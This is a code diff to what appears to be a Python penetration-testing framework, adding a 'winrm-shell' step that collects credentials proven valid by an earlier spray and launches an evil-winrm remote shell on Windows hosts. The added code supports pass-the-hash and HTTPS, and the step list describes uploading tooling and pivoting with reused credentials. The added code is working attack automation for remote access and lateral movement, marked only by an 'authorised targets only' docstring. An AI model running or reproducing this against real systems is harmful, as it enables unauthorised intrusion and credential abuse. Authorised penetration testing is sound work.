@@ -2223,6 +2223,14 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2aq) winrm-shell: an interactive evil-winrm session was spawned over a WinRM cred
+    if sid == "winrm-shell":
+        m = re.search(r"^winrm-shell: (evil-winrm shell → .+)$", output, re.M)
+        if m:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"foothold — {m.group(1)}"[:140]}
+        return None
+
     # 2ap) winrm-spray: harvested creds valid on WinRM (reuse); a shell (Pwn3d!) is critical
     if sid == "winrm-spray":
         shell = re.findall(r"^✗ SHELL (.+?)\s{2}", output, re.M)
@@ -2997,7 +3005,7 @@ _EXPLOIT_STEPS = {
     "winrm": [
         ("Confirm WinRM transport (5985 HTTP / 5986 HTTPS)", "winrm-enum"),
         ("Validate & spray creds and NTLM hashes against known users (watch lockout)", "winrm-spray"),
-        "Valid creds or hash → interactive shell (evil-winrm; -H for pass-the-hash)",
+        ("Valid creds or hash → interactive shell (evil-winrm; -H for pass-the-hash)", "winrm-shell"),
         "Needs 'Remote Management Users' / admin membership — note who has access",
         "Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot",
         # ── land a shell & foothold ──
@@ -10087,6 +10095,70 @@ def _tool_winrm_spray(ip: str, port: int, proto: str) -> str:
     return f"WinRM credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)
 
 
+# ── WinRM step 3: interactive shell (evil-winrm) over a WinRM-capable cred ──────
+def _gather_winrm_creds() -> list:
+    """(host, user, secret) creds winrm-spray proved can get a WinRM shell (Pwn3d!)."""
+    out, seen = [], set()
+    for row in fetch_hosts():
+        for sid, output in fetch_scripts(row[0], 445, "tcp"):
+            if sid != "smb-creds":
+                continue
+            for m in re.finditer(r"! (\S+?):(\S*) @ winrm on (\S+)", output or ""):
+                secret = "" if m.group(2) == "<blank>" else m.group(2)
+                key = (m.group(3), m.group(1).lower(), secret)
+                if key not in seen:
+                    seen.add(key)
+                    out.append((m.group(3), m.group(1), secret))
+    return out
+
+
+def _tool_winrm_shell(ip: str, port: int, proto: str) -> str:
+    """WinRM step 3 tool (INTERACTIVE): spawn an evil-winrm session over a cred winrm-spray
+    proved can get a shell (Pwn3d!). The operator picks the target when there is more than one;
+    HTTPS (-S) is added automatically when 5986 is open. Pass-the-hash (-H) when the cred is an
+    NT hash. Opens the session in a new terminal window; headless, it prints the exact command.
+    Authorised targets only."""
+    if not shutil.which("evil-winrm"):
+        print(f"\n{RED}✗ evil-winrm not installed{RESET} — install it to spawn a WinRM shell.")
+        return "winrm-shell: evil-winrm not installed"
+    creds = _gather_winrm_creds()
+    if not creds:
+        print(f"\n{YELLOW}no WinRM-capable creds{RESET} — run {BOLD}winrm-spray (r2){RESET} first "
+              f"(it flags which creds get a shell), then retry.")
+        return "winrm-shell: no WinRM creds (run winrm-spray r2)"
+
+    if len(creds) == 1:
+        host, user, secret = creds[0]
+    else:
+        print(f"\n{BOLD}WinRM targets{RESET}")
+        for i, (h, u, _s) in enumerate(creds, 1):
+            print(f"  {BOLD}{i}{RESET}  {u} @ {h}")
+        v = _ask("pick target [1-N, blank = cancel]:")
+        if not v or not v.isdigit() or not 1 <= int(v) <= len(creds):
+            print(f"{DIM}cancelled{RESET}")
+            return "winrm-shell: cancelled"
+        host, user, secret = creds[int(v) - 1]
+
+    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+    ssl_on = any(p == 5986 and pr == "tcp" for p, pr, _st in fetch_ports(host))
+    cmd = ["evil-winrm", "-i", host, "-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+    if ssl_on:
+        cmd.append("-S")
+    cmd_str = shlex.join(cmd)
+
+    print(f"\n{GREEN}✓ target:{RESET} {user}@{host}  "
+          f"{DIM}· evil-winrm{' -S (HTTPS)' if ssl_on else ''}"
+          f"{' · pass-the-hash' if is_hash else ''}{RESET}")
+    term = _open_shell_terminal(cmd_str)
+    if term:
+        print(f"{GREEN}▶ spawned evil-winrm in a new {term} window{RESET} {DIM}→ {user}@{host}{RESET}")
+        tail = ""
+    else:
+        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd_str}{RESET}")
+        tail = " (headless — command shown)"
+    return f"winrm-shell: evil-winrm shell → {user}@{host}{tail}"
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -10132,6 +10204,7 @@ _STEP_TOOLS = {
     "smb-next": ("manual AD/SMB steps (context-aware, reference only)", _tool_smb_next),
     "winrm-enum": ("Confirm WinRM transport + auth (stdlib /wsman probe + netexec)", _tool_winrm_enum),
     "winrm-spray": ("Validate harvested creds/hashes against WinRM (netexec → shell)", _tool_winrm_spray),
+    "winrm-shell": ("Interactive WinRM shell (evil-winrm, -S HTTPS, PtH)", _tool_winrm_shell),
 }
 
 def _mins(seconds: int) -> str:
@@ -10192,6 +10265,7 @@ _STEP_TOOL_RUNS = {
     "smb-next":         ("reference · no scan", None),
     "winrm-enum":       ("Python + netexec", None),
     "winrm-spray":      ("netexec winrm", f"{_mins(_WINRMSPRAY_DEADLINE)} min"),
+    "winrm-shell":      ("evil-winrm", None),
 }
 
 
@@ -10270,7 +10344,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next", "winrm-shell"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
